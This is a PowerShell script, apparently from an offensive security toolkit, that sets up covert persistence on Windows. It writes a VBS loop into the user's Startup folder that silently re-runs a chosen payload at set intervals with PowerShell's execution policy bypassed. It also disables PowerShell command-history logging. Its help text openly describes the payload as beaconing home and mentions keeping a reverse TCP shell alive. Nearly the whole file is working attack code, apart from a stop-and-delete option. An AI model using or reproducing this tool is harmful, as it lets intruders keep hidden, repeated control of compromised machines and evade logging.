<#
.SYNOPSIS
   Persiste scripts using StartUp folder

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   This persistence module beacons home in sellected intervals defined
   by CmdLet User with the help of -BeaconTime parameter. The objective
   its to execute our script on every startup from 'xx' to 'xx' seconds.

.NOTES
   Remark: Use double quotes if Path has any empty spaces in name.
   Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
   to manual check the status of wscript process (BeaconHome function)
   Remark: Payload supported extensions: ps1|exe|py|vbs|bat

.Parameter Persiste
   Accepts Stop (persistence) or the absoluct \ relative path of payload

.Parameter BeaconTime
   Accepts the beacon home int value (in seconds)

.EXAMPLE
   PS C:\> Get-Help .\Persiste.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\Persiste.ps1 -Persiste Stop
   Stops wscript process (vbs) and delete persistence.vbs script
   Remark: This function stops the persiste.vbs from beacon home
   and deletes persiste.vbs Leaving our reverse tcp shell intact.

.EXAMPLE
   PS C:\> .\Persiste.ps1 -Persiste `$Env:TMP\Payload.ps1
   Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution

.EXAMPLE
   PS C:\> .\Persiste.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
   Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution

.OUTPUTS
   Payload.ps1 Persistence Settings
   ---------------------------------
   BeaconHomeInterval : 10 (sec) interval
   ClientAbsoluctPath : C:\Users\pedro\AppData\Roaming\Temp\Payload.ps1
   PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
   PersistenceScript  : Successfuly Created!
   wscriptProcStatus  : Stopped! {require SKYNET restart}
   OR the manual execution of Persiste.vbs script! {StartUp}
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Persiste="false",
   [int]$BeaconTime='28'
)


Write-Host ""
$Remote_hostName = hostname
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
$TrdliState = $False

    ## Variable Declarations
    $ClientName = $Persiste.Split('\\')[-1] ## Get File Name from Path
    $PersistePath = "$Env:APPDATA\Microsoft\Windows" +
    "\Start Menu\Programs\" + "Startup\Persiste." + "vbs" -Join ''

    If($Persiste -ne "false" -and $Persiste -ne "Stop"){

        ## Make sure User Input [ -Persiste ] [ Path-to-payload ] is valid
        If(-not(Test-Path -Path "$Persiste")){## Check for file existence
            Write-Host "[error] Not found [ $Persiste ] in $Remote_hostName!" -ForegroundColor Red -BackgroundColor Black
            Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @Persiste because of User Input error.
        }

        ## Retrieve BeaconTime from persiste.vbs
        # If run for the 2º time [ -Persiste ] [ Path-to-payload ] 
        # Then the BeaconTime will be retrieved from persiste.vbs
        If(Test-Path -Path "$PersistePath"){
            $diskImage = Get-Content -Path $PersistePath|findstr /C:"wscript.sleep"
            $RetBeTiFrP = $diskImage -split(' ') ## Split into two arrays
            ## Retrieve BeaconTime value from 2º array
            # and replace (convert) miliseconds to seconds
            $BeaconTime = $RetBeTiFrP[1] -replace '000',''
        }

        ## Create Data Table for output
        Write-Host "$ClientName Persistence Settings" -ForegroundColor Green
        Write-Host "-------------------------------"
        Write-Host "BeaconHomeInterval : $BeaconTime (sec) interval"
        Write-Host "ClientAbsoluctPath : $Persiste"
        Write-Host "PersistenceScript  : $PersistePath"
   
        ## Create VBS beacon Home script
        $RawTime = "$BeaconTime" + "000"
        If(-not(Test-Path -Path "$PersistePath" -EA SilentlyContinue)){         
            echo "Set objShell = WScript.CreateObject(`"WScript.Shell`")" > "$PersistePath"
            echo "Do" >> "$PersistePath"
            echo "wscript.sleep $RawTime" >> "$PersistePath"

            ## Recomended function by @youhacker55
            # Payload supported extensions: ps1|exe|py|vbs|bat
            If($ClientName -Match '.ps1$'){
                echo "objShell.Run `"powershell -Exec Bypass -W 1 -File $Persiste`", 0, True" >> "$PersistePath"
            }ElseIf($ClientName -Match '.exe$'){
                echo "objShell.Run `"cmd /R start $Persiste`", 0, True" >> "$PersistePath"
            }ElseIf($ClientName -Match '.py$'){
                echo "objShell.Run `"cmd /R $Persiste`", 0, True" >> "$PersistePath"
            }ElseIf($ClientName -Match '.vbs$'){
                echo "objShell.Exec(`"cmd /R $Persiste`")" >> "$PersistePath"
            }ElseIf($ClientName -Match '.bat$'){
                echo "objShell.Exec(`"cmd /R $Persiste`")" >> "$PersistePath"
            }

            echo "Loop" >> "$PersistePath"
        }

        ## Make sure Persiste vbs script its created
        If(Test-Path -Path "$PersistePath"){
            Write-Host "PersistenceScript  : Successfuly Created!"
        }Else{
            Write-Host "PersistenceScript  : Fail to create Persiste.vbs!" -ForegroundColor Red -BackgroundColor Black
        }

        ## Make sure wscript process its running
        $VbsProc = (Get-Process wscript -EA SilentlyContinue).Responding
        If($VbsProc -ieq "True"){
            Write-Host "wscriptProcStatus  : Wscript Process Running! {*BeaconHome*}"
        }Else{
            Write-Host "wscriptProcStatus  : Stopped! {require $Remote_hostName restart}" -ForegroundColor Red -BackgroundColor Black
            Write-Host "OR the manual execution of Persiste.vbs script! {StartUp}"
        }
    }
   

    ## Stop\Delete Persistence tasks
    If($Persiste -ieq "Stop"){## Check for wscript process status

        Write-Host "$ClientName Persistence Settings" -ForegroundColor Green
        Write-Host "-------------------------"
        Start-Sleep -Seconds 1

        $CheckProc = (Get-Process -name wscript -EA SilentlyContinue).Responding
        If($CheckProc -ieq "True"){## wscript proccess found running
            Write-Host "[i] Stoping Wscript (vbs) Process!"
            Stop-Process -Name wscript -Force
            $TrdliState = $True
        }

        If(Test-Path -Path "$PersistePath"){## Chcek for Persiste.vbs existance
            Write-Host "[i] Deleting Persiste.vbs aux Script!"
            Remove-Item -Path "$PersistePath" -Force
            $TrdliState = $True
        }
        If($TrdliState -eq $True){## Report Persistence files|wscript process state
            Write-Host "[i] Local Persistence Successfuly Deleted!" -ForegroundColor Yellow
        }Else{
            Write-Host "[error] None persistence files found left behind!" -ForegroundColor Red -BackgroundColor Black      
        }
    }     
    Write-Host "";Start-Sleep -Seconds 1
}